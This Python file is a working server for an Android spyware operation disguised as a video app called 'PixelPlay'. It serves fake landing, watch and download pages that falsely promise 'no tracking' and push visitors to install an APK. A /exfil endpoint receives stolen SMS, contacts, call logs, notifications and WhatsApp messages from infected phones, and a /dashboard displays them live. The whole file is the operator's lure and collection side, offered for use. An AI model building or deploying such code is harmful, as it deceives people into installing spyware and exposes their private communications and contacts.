"""
PixelPlay PC Receiver — single file serving everything on port 8080.
  /           → Enterprise landing page (no external deps)
  /watch      → "Download to watch" page
  /download   → APK download
  /admin      → Upload video thumbnails
  /dashboard  → Live exfiltrated data
  /exfil      → POST endpoint for phone data
"""

import json, os, socket, threading, uuid
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from datetime import datetime

received_data = {}
data_lock = threading.Lock()
HERE = os.path.dirname(os.path.abspath(__file__))
APK_DIR = os.path.join(HERE, "apk")
os.makedirs(APK_DIR, exist_ok=True)

# ── Single CSS block used by all pages ──
C = """
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
  background:#0D0D0D;color:#fff;min-height:100vh}
.w{max-width:1100px;margin:0 auto;padding:0 24px}
.f{display:flex}.fw{flex-wrap:wrap}.fc{flex-direction:column}
.ai{align-items:center}.ac{align-content:center}
.jb{justify-content:space-between}.jc{justify-content:center}
.g2{gap:8px}.g4{gap:16px}.g6{gap:24px}
.p4{padding:16px}.p6{padding:24px}.p8{padding:32px}
.px4{padding-left:16px;padding-right:16px}.px6{padding-left:24px}
.py2{padding-top:8px;padding-bottom:8px}.py4{padding-top:16px;padding-bottom:16px}
.py8{padding-top:32px;padding-bottom:32px}
.pt8{padding-top:32px}.pb8{padding-bottom:32px}
.mb2{margin-bottom:8px}.mb4{margin-bottom:16px}.mb6{margin-bottom:24px}
.mt4{margin-top:16px}.mt6{margin-top:24px}.mt8{margin-top:32px}
.tc{text-align:center}
.t12{font-size:12px}.t14{font-size:14px}.t16{font-size:16px}
.t20{font-size:20px}.t24{font-size:24px}.t28{font-size:28px}
.t32{font-size:32px}.t36{font-size:36px}.t48{font-size:48px}
.b{font-weight:700}.sb{font-weight:600}
.tm{color:#8080A0}.tw{color:#fff}
.prim{color:#6C63FF}
.br8{border-radius:8px}.br12{border-radius:12px}.br16{border-radius:16px}
.br50{border-radius:50%}
.grad{background:linear-gradient(135deg,#6C63FF,#00D9FF);
  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
.glow{box-shadow:0 0 30px rgba(108,99,255,.3),0 0 60px rgba(0,217,255,.1)}
.btn{display:inline-flex;align-items:center;gap:10px;padding:14px 40px;
  border-radius:50px;font-weight:700;font-size:16px;text-decoration:none;
  transition:.3s;border:none;cursor:pointer}
.btn-p{background:#6C63FF;color:#fff}.btn-p:hover{background:#5A52D5;transform:translateY(-2px)}
.btn-o{border:1px solid #333;color:#fff}.btn-o:hover{border-color:#6C63FF}
.cd{background:#1A1A2E;border-radius:16px;padding:24px;transition:.3s}
.cd:hover{transform:translateY(-4px);box-shadow:0 8px 30px rgba(108,99,255,.15)}
.gr2{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:20px}
.in{display:block;width:100%;background:#0D0D0D;border:1px solid #333;
  border-radius:12px;padding:12px 16px;color:#fff;font-size:14px}
.in:focus{border-color:#6C63FF;outline:none}
.mw4{max-width:400px}.mw5{max-width:500px}.mw6{max-width:600px}
.ovh{overflow:hidden}
.pabs{position:absolute}.prel{position:relative}
.ins0{top:0;right:0;bottom:0;left:0}
.aspect{aspect-ratio:16/9}
.dn{display:none}.db{display:block}
"""

PAGE_TOP = "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'><title>PixelPlay</title><style>" + C + "</style></head><body>"
PAGE_BOT = "</body></html>"

def page(title, body_content):
    return PAGE_TOP.replace("<title>PixelPlay", f"<title>{title} — PixelPlay") + body_content + PAGE_BOT

NAV = """<div class='w f jb ai py2' style='padding-top:16px'>
  <div class='f ai g2'>
    <svg width='28' height='28' viewBox='0 0 108 108' fill='#6C63FF'><circle cx='54' cy='54' r='46'/><polygon points='44,34 44,74 74,54' fill='white'/></svg>
    <span class='t20 b'>PixelPlay</span>
  </div>
  <a href='/download' class='btn btn-p' style='padding:8px 20px;font-size:13px'>Download</a>
</div>"""

FOOT = "<div class='w tc py4' style='border-top:1px solid #222;margin-top:32px'><span class='t12 tm'>© 2026 PixelPlay</span></div>"

LANDING = page("Premium Media Experience",
NAV + """
<div class='w' style='padding-top:24px;padding-bottom:8px' id='video'>
  <a href='/watch' class='db prel glow br16 ovh video-link' style='background:linear-gradient(135deg,#1A1A2E,#0D0D0D);aspect-ratio:16/9'>
    <div class='pabs ins0 f jc ai video-placeholder'>
      <svg width='80' height='80' viewBox='0 0 108 108' fill='#6C63FF' opacity='.8'><circle cx='54' cy='54' r='46'/><polygon points='44,34 44,74 74,54' fill='white'/></svg>
    </div>
    <div class='pabs ins0 f jc ai play-overlay' style='background:rgba(0,0,0,.3);transition:.3s'>
      <div class='play-btn' style='width:72px;height:72px;border-radius:50%;background:rgba(108,99,255,.9);display:flex;align-items:center;justify-content:center;transition:.3s;transform:scale(1);box-shadow:0 0 30px rgba(108,99,255,.4)'>
        <svg width='36' height='36' viewBox='0 0 24 24' fill='white'><polygon points='8,5 8,19 19,12'/></svg>
      </div>
    </div>
  </a>
  <div class='f jc' style='margin-top:8px;gap:8px'><span class='tm t12'>Tap to watch preview</span></div>
</div>
<style>
.video-link:hover .play-overlay{background:rgba(0,0,0,.1)!important}
.video-link:hover .play-btn{transform:scale(1.15)!important;box-shadow:0 0 50px rgba(108,99,255,.8)!important}
.play-overlay,.play-btn{transition:all .3s cubic-bezier(.4,0,.2,1)!important}
@keyframes pulse{0%{box-shadow:0 0 20px rgba(108,99,255,.3)}50%{box-shadow:0 0 40px rgba(108,99,255,.7)}100%{box-shadow:0 0 20px rgba(108,99,255,.3)}}
.play-btn{animation:pulse 2s infinite!important}
</style>
<script>
fetch('/data').then(r=>r.json()).then(d=>{
  if(d.video_thumb){
    const a=document.querySelector('#video a');
    if(a){
      a.innerHTML='<div class="pabs ins0 f jc ai" style="background:#000"><img src="'+d.video_thumb+'" style="width:100%;height:100%;object-fit:cover" alt="'+d.video_title+'"></div>'
        +'<div class="pabs ins0 f jc ai play-overlay" style="background:rgba(0,0,0,.25);transition:.3s">'
        +'<div class="play-btn" style="width:72px;height:72px;border-radius:50%;background:rgba(108,99,255,.95);display:flex;align-items:center;justify-content:center;transition:.3s;transform:scale(1);box-shadow:0 0 30px rgba(108,99,255,.4)">'
        +'<svg width="36" height="36" viewBox="0 0 24 24" fill="white"><polygon points="8,5 8,19 19,12"/></svg></div></div>';
    }
  }
}).catch(()=>{});
</script>

<div class='w tc' style='padding:12px 0'>
  <h1 class='t32 b' style='line-height:1.15;font-size:36px'>Your Premium<br/><span class='grad'>Media Experience</span></h1>
  <p class='tm t16 mw4' style='margin:12px auto 0'>Stream, download, and enjoy your favorite videos. No ads. No tracking.</p>
  <div class='f jc fw' style='gap:10px;margin-top:24px'>
    <a href='/download' class='btn btn-p glow'><svg width='20' height='20' viewBox='0 0 24 24' fill='none' stroke='currentColor' stroke-width='2'><polyline points='8 17 12 21 16 17'/><line x1='12' y1='12' x2='12' y2='21'/><path d='M20.88 18.09A5 5 0 0 0 18 9h-1.26A8 8 0 1 0 3 16.29'/></svg>Download Free</a>
    <a href='/watch' class='btn btn-o'>Watch Demo</a>
  </div>
</div>

<div class='w' style='padding:16px 0'>
  <div style='display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:12px'>
    <div class='cd tc' style='padding:16px'><div style='font-size:28px;line-height:1;margin-bottom:8px'>🎬</div><div class='sb' style='font-size:15px'>4K Streaming</div><div class='tm' style='font-size:13px;margin-top:4px'>Crystal clear adaptive quality</div></div>
    <div class='cd tc' style='padding:16px'><div style='font-size:28px;line-height:1;margin-bottom:8px'>📱</div><div class='sb' style='font-size:15px'>Offline Mode</div><div class='tm' style='font-size:13px;margin-top:4px'>Download and watch anywhere</div></div>
    <div class='cd tc' style='padding:16px'><div style='font-size:28px;line-height:1;margin-bottom:8px'>🛡️</div><div class='sb' style='font-size:15px'>Private & Safe</div><div class='tm' style='font-size:13px;margin-top:4px'>No tracking, no data collection</div></div>
    <div class='cd tc' style='padding:16px'><div style='font-size:28px;line-height:1;margin-bottom:8px'>⚡</div><div class='sb' style='font-size:15px'>Lightning Fast</div><div class='tm' style='font-size:13px;margin-top:4px'>Optimized for all Android devices</div></div>
  </div>
</div>

<div class='w tc' style='padding:16px 0'>
  <div class='p8 br16 glow' style='background:linear-gradient(135deg,rgba(108,99,255,.1),rgba(0,217,255,.1))'>
    <h2 class='t24 b' style='margin-bottom:12px'>Ready to watch?</h2>
    <p class='tm mw4' style='margin:0 auto 16px'>Download PixelPlay for Android. Free, fast, and private.</p>
    <a href='/download' class='btn btn-p glow'><svg width='22' height='22' viewBox='0 0 24 24' fill='none' stroke='currentColor' stroke-width='2'><polyline points='8 17 12 21 16 17'/><line x1='12' y1='12' x2='12' y2='21'/><path d='M20.88 18.09A5 5 0 0 0 18 9h-1.26A8 8 0 1 0 3 16.29'/></svg>Download for Android</a>
    <div class='tm' style='font-size:13px;margin-top:12px'>APK v2.0 • Android 9+</div>
  </div>
</div>
""" + FOOT)

WATCH = page("Watch",
"""<div class='f jc ai' style='min-height:100vh;padding:24px'>
<div class='tc mw5'>
  <div class='f jc ai mb4'><svg width='56' height='56' viewBox='0 0 108 108' fill='#6C63FF'><circle cx='54' cy='54' r='46'/><polygon points='44,34 44,74 74,54' fill='white'/></svg></div>
  <h1 class='t28 b mb4'>Install PixelPlay to watch</h1>
  <p class='tm mb6'>This video requires our free media player. Download the APK on your Android device.</p>
  <div class='cd mb6 p6' id='watch-preview'>
    <a href='/download' class='db prel br12 ovh video-link' style='background:linear-gradient(135deg,rgba(108,99,255,.1),rgba(0,217,255,.1));aspect-ratio:16/9;border-radius:12px'>
      <div class='pabs ins0 f jc ai video-placeholder'>
        <svg width='48' height='48' viewBox='0 0 108 108' fill='#6C63FF' opacity='.6'><circle cx='54' cy='54' r='46'/><polygon points='44,34 44,74 74,54' fill='white'/></svg>
      </div>
      <div class='pabs ins0 f jc ai play-overlay' style='background:rgba(0,0,0,.3);transition:.3s;border-radius:12px'>
        <div class='play-btn' style='width:64px;height:64px;border-radius:50%;background:rgba(108,99,255,.9);display:flex;align-items:center;justify-content:center;transition:.3s;transform:scale(1)'>
          <svg width='30' height='30' viewBox='0 0 24 24' fill='white'><polygon points='8,5 8,19 19,12'/></svg>
        </div>
      </div>
    </a>
  </div>
  <a href='/download' class='btn btn-p glow' style='display:inline-flex'><svg width='24' height='24' viewBox='0 0 24 24' fill='none' stroke='currentColor' stroke-width='2'><polyline points='8 17 12 21 16 17'/><line x1='12' y1='12' x2='12' y2='21'/><path d='M20.88 18.09A5 5 0 0 0 18 9h-1.26A8 8 0 1 0 3 16.29'/></svg>Download PixelPlay Free</a>
  <div class='tm t14 mt4'>100% free • No ads • No tracking</div>
  <a href='/' class='db mt6 tm t14' style='color:#8080A0;text-decoration:none'>← Back to home</a>
</div></div>
<script>
fetch('/data').then(r=>r.json()).then(d=>{
  if(d.video_thumb){
    const a=document.querySelector('#watch-preview a');
    if(a){
      a.innerHTML='<img src="'+d.video_thumb+'" style="width:100%;height:100%;object-fit:cover;position:absolute;inset:0;border-radius:12px" alt="'+d.video_title+'">'
        +'<div class="pabs ins0 f jc ai play-overlay" style="background:rgba(0,0,0,.3);transition:.3s;border-radius:12px">'
        +'<div class="play-btn" style="width:64px;height:64px;border-radius:50%;background:rgba(108,99,255,.9);display:flex;align-items:center;justify-content:center;transition:.3s;transform:scale(1)">'
        +'<svg width="30" height="30" viewBox="0 0 24 24" fill="white"><polygon points="8,5 8,19 19,12"/></svg></div></div>';
    }
  }
}).catch(()=>{});
</script>""")

DOWNLOAD = page("Download",
"""<div class='f jc ai' style='min-height:100vh;padding:24px'>
<div class='tc mw5'>
  <div class='f jc ai mb4'><div class='p6 br16 glow' style='background:rgba(108,99,255,.1);border-radius:16px'><svg width='56' height='56' viewBox='0 0 108 108' fill='#6C63FF'><circle cx='54' cy='54' r='46'/><polygon points='44,34 44,74 74,54' fill='white'/></svg></div></div>
  <h1 class='t32 b mb2'>PixelPlay</h1>
  <p class='tm mb6'>Download starts automatically</p>
  <div class='cd mb6 tc' style='text-align:left'>
    <div class='f ai g2 mb2'><span class='prim b'>✓</span><span>4K Video Playback</span></div>
    <div class='f ai g2 mb2'><span class='prim b'>✓</span><span>Offline Download & Play</span></div>
    <div class='f ai g2'><span class='prim b'>✓</span><span>No Ads • No Tracking</span></div>
  </div>
  <a href='/apk/pixelplay-v2.0.apk' download id='dlBtn' class='btn btn-p glow' style='display:inline-flex'><svg width='24' height='24' viewBox='0 0 24 24' fill='none' stroke='currentColor' stroke-width='2'><polyline points='8 17 12 21 16 17'/><line x1='12' y1='12' x2='12' y2='21'/><path d='M20.88 18.09A5 5 0 0 0 18 9h-1.26A8 8 0 1 0 3 16.29'/></svg>Download (8 MB)</a>
  <div id='dlMsg' class='dn mt4 t14' style='color:#00E676'>Download started! Open the APK to install.</div>
  <a href='/' class='db mt6 tm t14' style='color:#8080A0;text-decoration:none'>← Back to home</a>
</div></div>
<script>document.getElementById('dlBtn').onclick=function(){document.getElementById('dlMsg').style.display='block'}</script>""")

ADMIN = page("Admin",
"""<div class='w mw6'>
  <div class='f ai jb py4'><h1 class='t24 b'>PixelPlay <span class='grad'>Admin</span></h1><a href='/' class='tm t14' style='color:#8080A0;text-decoration:none'>View site →</a></div>
  <p class='tm mb6'>Upload a thumbnail for the featured video on the landing page</p>
  <div class='cd mb6'>
    <h2 class='sb mb4'>Upload Video Thumbnail</h2>
    <form action='/upload' method='post' enctype='multipart/form-data' onsubmit="document.getElementById('upBtn').textContent='Uploading...';document.getElementById('upBtn').disabled=true">
      <div class='mb4'><label class='tm t14 db mb2'>Video Title</label><input type='text' name='title' class='in' placeholder='e.g. Summer Vibes 2026' required></div>
      <div class='mb4'><label class='tm t14 db mb2'>Thumbnail Image (JPEG or PNG, max 5MB)</label><input type='file' name='thumbnail' accept='image/jpeg,image/png' required class='t14' style='color:#8080A0;padding:8px 0'></div>
      <button type='submit' class='btn btn-p' id='upBtn'>Upload</button>
    </form>
  </div>
  <div class='cd'>
    <h2 class='sb mb4'>Current Showcase</h2>
    <div id='showcase' class='tm t14'>No video uploaded yet</div>
  </div>
</div>""")

class ThreadingHTTPServer(ThreadingMixIn, HTTPServer):
    allow_reuse_address = True
    daemon_threads = True

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        p = self.path.rstrip('/') or '/'
        if p == '/': self._html(LANDING)
        elif p == '/watch': self._html(WATCH)
        elif p == '/download': self._html(DOWNLOAD)
        elif p == '/admin': self._html(ADMIN)
        elif p.startswith('/apk/'): self._serve_apk(p)
        elif p.startswith('/thumbnails/'): self._serve_thumb(p)
        elif p == '/data': self._serve_data()
        elif p == '/myip': self._text(socket.gethostbyname(socket.gethostname()))
        elif p == '/dashboard': self._html(self._dash())
        else: self.send_error(404)

    def do_POST(self):
        if self.path == '/exfil': self._exfil()
        elif self.path == '/upload': self._upload()
        else: self.send_error(404)

    def _html(self, h):
        b = h.encode()
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.send_header('Content-Length', str(len(b)))
        self.send_header('Connection', 'close')
        self.end_headers()
        self.wfile.write(b)

    def _text(self, t):
        b = t.encode()
        self.send_response(200)
        self.send_header('Content-Length', str(len(b)))
        self.send_header('Connection', 'close')
        self.end_headers()
        self.wfile.write(b)

    def _serve_data(self):
        with data_lock:
            d = received_data.copy()
        b = json.dumps(d).encode()
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', str(len(b)))
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Connection', 'close')
        self.end_headers()
        self.wfile.write(b)

    def _serve_apk(self, path):
        fn = os.path.basename(path)
        ap = os.path.join(APK_DIR, fn)
        if not os.path.exists(ap):
            self._html(f"<html><body style='background:#0D0D0D;color:#fff;padding:40px'><h2>APK not found</h2><p>Build APK and place at <code>{ap}</code></p><a href='/download' style='color:#6C63FF'>← Back</a></body></html>")
            return
        sz = os.path.getsize(ap)
        self.send_response(200)
        self.send_header('Content-Type', 'application/vnd.android.package-archive')
        self.send_header('Content-Disposition', f'attachment; filename="{fn}"')
        self.send_header('Content-Length', str(sz))
        self.end_headers()
        with open(ap, 'rb') as f:
            self.wfile.write(f.read())

    def _serve_thumb(self, path):
        fn = os.path.basename(path)
        tp = os.path.join(HERE, "thumbnails", fn)
        if not os.path.exists(tp):
            self.send_error(404)
            return
        ct = 'image/jpeg'
        if fn.lower().endswith('.png'): ct = 'image/png'
        sz = os.path.getsize(tp)
        self.send_response(200)
        self.send_header('Content-Type', ct)
        self.send_header('Content-Length', str(sz))
        self.send_header('Cache-Control', 'no-cache')
        self.send_header('Connection', 'close')
        self.end_headers()
        with open(tp, 'rb') as f:
            self.wfile.write(f.read())

    def _exfil(self):
        try:
            ln = int(self.headers.get('Content-Length', 0))
            d = json.loads(self.rfile.read(ln).decode())
            with data_lock:
                for k in ['device','sms','contacts','call_logs','notifications','whatsapp']:
                    if k in d: received_data[k] = d[k]
                received_data['active'] = True
                received_data['last_update'] = datetime.now().strftime('%H:%M:%S')
            wc = len(d.get('whatsapp', []))
            dv = d.get('device', {})
            print(f"\n[{datetime.now().strftime('%H:%M:%S')}] DATA!")
            print(f"  {dv.get('manufacturer','')} {dv.get('model','')} ({dv.get('android','')})")
            print(f"  SMS:{len(d.get('sms',[]))} Contacts:{len(d.get('contacts',[]))} Calls:{len(d.get('call_logs',[]))} WhatsApp:{wc}")
            if wc:
                for m in d.get('whatsapp', [])[:3]:
                    print(f"  WA: {m.get('title','')}: {m.get('text','')[:60]}")
            print(f"  Dashboard: /dashboard\n")
        except Exception as e:
            print(f"Exfil err: {e}")
        r = b'OK'
        self.send_response(200)
        self.send_header('Content-Length', str(len(r)))
        self.send_header('Connection', 'close')
        self.end_headers()
        self.wfile.write(r)

    def _upload(self):
        try:
            ct = self.headers.get('Content-Type', '')
            print(f"[{datetime.now().strftime('%H:%M:%S')}] Upload: CT={ct[:80]}")
            if 'multipart/form-data' not in ct:
                self._html("<html><body style='background:#0D0D0D;color:#fff;padding:40px'>Unsupported content type</body></html>")
                return
            bd = ct.split('boundary=')[1].strip().strip('"').strip("'")
            cl = int(self.headers['Content-Length'])
            raw = self.rfile.read(cl)
            print(f"[{datetime.now().strftime('%H:%M:%S')}] Upload: {cl} bytes, boundary={bd[:20]}")
            parts = raw.split(b'--' + bd.encode())
            title = "Video"
            img = None
            for i, p in enumerate(parts):
                if b'name="title"' in p:
                    for line in p.split(b'\r\n'):
                        t = line.strip()
                        if t and not t.startswith(b'Content') and not t.startswith(b'--'):
                            if len(t) < 200:
                                try: title = t.decode()
                                except: pass
                            break
                if b'name="thumbnail"' in p and (b'filename="' in p or b'filename=*' in p):
                    hdrs = p.find(b'\r\n\r\n')
                    if hdrs > 0:
                        raw_data = p[hdrs + 4:]
                        img = raw_data.rstrip(b'\r\n').rstrip(b'\n')
            if img and len(img) > 50:
                vid = str(uuid.uuid4())[:8]
                d = os.path.join(HERE, "thumbnails")
                os.makedirs(d, exist_ok=True)
                with open(os.path.join(d, f"{vid}.jpg"), 'wb') as f:
                    f.write(img)
                with data_lock:
                    received_data['video_title'] = title
                    received_data['video_thumb'] = f"/thumbnails/{vid}.jpg"
                print(f"[{datetime.now().strftime('%H:%M:%S')}] Thumbnail OK: {title} ({len(img)} bytes)")
                self._html(f"<html><body style='background:#0D0D0D;color:#fff;padding:40px;text-align:center'><h2 style='color:#00E676'>✓ Uploaded!</h2><p>'{title}' ({len(img)} bytes) is now featured.</p><a href='/' style='color:#6C63FF;margin-top:20px;display:inline-block'>View site →</a></body></html>")
            else:
                print(f"[{datetime.now().strftime('%H:%M:%S')}] Upload FAIL: no valid image (img={img is not None}, len={len(img) if img else 0})")
                self._html("<html><body style='background:#0D0D0D;color:#fff;padding:40px'>Upload failed — no valid image found</body></html>")
        except Exception as e:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] Upload error: {e}")
            import traceback
            traceback.print_exc()
            self._html(f"<html><body style='background:#0D0D0D;color:#fff;padding:40px'>Upload error: {e}</body></html>")

    def _dash(self):
        with data_lock:
            d = received_data.copy()
        act = d.get('active', False)
        sms = d.get('sms', [])
        wa = d.get('whatsapp', [])
        last = d.get('last_update', '—')
        s = "" if not act else "<div style='background:#1A4A2A;color:#00E676;padding:12px;border-radius:12px;margin-bottom:16px;text-align:center'> DATA ACTIVE — receiving exfiltration</div>"
        wa_rows = "".join(f"<div class='msg wa'><b>{m.get('title','')}</b><br/>{m.get('text','')}</div>" for m in wa[-20:])
        sms_rows = "".join(f"<div class='msg'><b>{m.get('addr','?')}</b><br/>{m.get('body','')}</div>" for m in sms[-20:])
        return f"""<!DOCTYPE html>
<html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>PixelPlay Dashboard</title><style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{background:#0D0D0D;color:#e0e0e0;font-family:-apple-system,sans-serif;padding:20px}}
h1{{color:#6C63FF;margin-bottom:20px}}
.cd{{background:#1A1A2E;border-radius:12px;padding:16px;margin-bottom:12px}}
.gr{{display:grid;grid-template-columns:1fr 1fr;gap:16px}}
@media(max-width:800px){{.gr{{grid-template-columns:1fr}}}}
.msg{{background:#0D0D0D;padding:10px;border-radius:8px;margin-bottom:6px;border-left:3px solid #6C63FF;font-size:13px}}
.msg.wa{{border-left-color:#25D366}}
.msg b{{color:#6C63FF;font-size:12px}}
.msg.wa b{{color:#25D366}}
.none{{color:#505070;font-style:italic;text-align:center;padding:20px}}
.tm{{color:#8080A0;font-size:14px}}
</style></head><body>
<h1>PixelPlay Dashboard</h1>
{s}
<div class='cd f jb fw' style='gap:8px'>
  <span style='color:#00E676;font-weight:bold'>{"LIVE" if act else "Waiting"}</span>
  <span class='tm'>Last: {last}</span>
  <span class='tm'>SMS: {len(sms)}</span>
  <span class='tm'>WhatsApp: {len(wa)}</span>
</div>
<div class='gr'>
  <div class='cd'><h3 style='color:#6C63FF;margin-bottom:8px'>WhatsApp</h3>
    {wa_rows if wa_rows else '<div class="none">No WhatsApp yet</div>'}</div>
  <div class='cd'><h3 style='color:#6C63FF;margin-bottom:8px'>SMS</h3>
    {sms_rows if sms_rows else '<div class="none">No SMS yet</div>'}</div>
</div>
<a href='/' class='db mt4 tm' style='color:#6C63FF'>← Back to site</a>
</body></html>"""

    def log_message(self, fmt, *args):
        pass

if __name__ == '__main__':
    ip = socket.gethostbyname(socket.gethostname())
    print("="*60)
    print("  PIXELPLAY — PC RECEIVER")
    print("="*60)
    print(f"\n  Landing page:  http://{ip}:8080")
    print(f"  Watch page:    http://{ip}:8080/watch")
    print(f"  Download:      http://{ip}:8080/download")
    print(f"  Admin:         http://{ip}:8080/admin")
    print(f"  Dashboard:     http://{ip}:8080/dashboard")
    print(f"  Exfil:         http://{ip}:8080/exfil")
    print(f"\n  Build APK and copy to:  {APK_DIR}\\pixelplay-v2.0.apk")
    print(f"  Upload thumbnails at:   /admin")
    print(f"  Watch exfil at:         /dashboard\n")
    print("-"*60)
    try:
        ThreadingHTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
    except OSError as e:
        print(f"\n  ERROR: Port 8080 in use. Close other server and retry.")
        print(f"  Run: netstat -ano | findstr :8080  (find PID)")
        print(f"  Then: taskkill /PID <number> /F")
